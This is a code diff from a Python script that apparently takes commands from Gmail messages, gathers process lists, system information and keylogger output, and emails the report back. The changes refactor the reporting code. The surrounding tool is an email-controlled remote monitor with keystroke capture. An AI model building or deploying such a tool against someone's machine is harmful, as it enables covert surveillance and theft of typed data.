@@ -89,17 +89,17 @@ def checkRequirement(lines):
             elif command_execute == "Task Manager":
                 if command_argument == "0":
                     #all
-                    allProcess = TaskManager.print_all_apps()
-                    report = f"All Processes: \n{allProcess}"
+                    allProcess = TaskManager.get_processes_list()
+                    allApp = TaskManager.get_running_apps()
+                    report = f"All Processes: \n{allProcess}\n--------------------------------------------\nAll Running Application:\n{allApp}"
                 elif command_argument == "1":
-                    #running & not responding
-                    statusProcesses = TaskManager.print_all_processes()
+                    #process with status
+                    statusProcesses = TaskManager.get_processes_with_status()
                     report = f"Processes with status: \n{statusProcesses}"
-                elif command_argument == "3":
+                elif command_argument == "2":
                     #CPU & RAM
-                    memProcesses = TaskManager.print_all_processes()
+                    memProcesses = TaskManager.get_sorted_processes()
                     report = f"Processes with memory consumption: \n{memProcesses}"
-                TaskManager.print_all_processes()
             elif command_execute == "System Info":
                 sysif = SystemInfo.getSystemInfo()
                 # print(f"System Information: {sysif}")
@@ -118,11 +118,12 @@ def checkRequirement(lines):
                 report = f"Keylogger: {keylogger}"
 
             print(report)
-            reportPath = f"../Assets/Report/report.txt"
-            with open(reportPath, 'w') as file:
-                file.write(report)
-
-            print(f"Report has been saved to {reportPath}")
+            try:
+                with open("report.txt", 'w') as file: 
+                    file.write(report)
+                    print(f"Report has been saved to report.txt")
+            except Exception as e:
+                print(f"Error writing to file: {e}")
 
 def sendReport(reportPath, recipient_email):
     global service
@@ -184,7 +185,7 @@ def main():
                                 checkRequirement(lines)
                                 sendReport(reportPath, name)
                             # mark the message as read (optional)
-                            msg = service.users().messages().modify(userId='me', id=message['id'], body={'removeLabelIds': ['UNREAD']}).execute()
+                            # msg = service.users().messages().modify(userId='me', id=message['id'], body={'removeLabelIds': ['UNREAD']}).execute()
                         except BaseException as error:
                             pass
         except Exception as error:
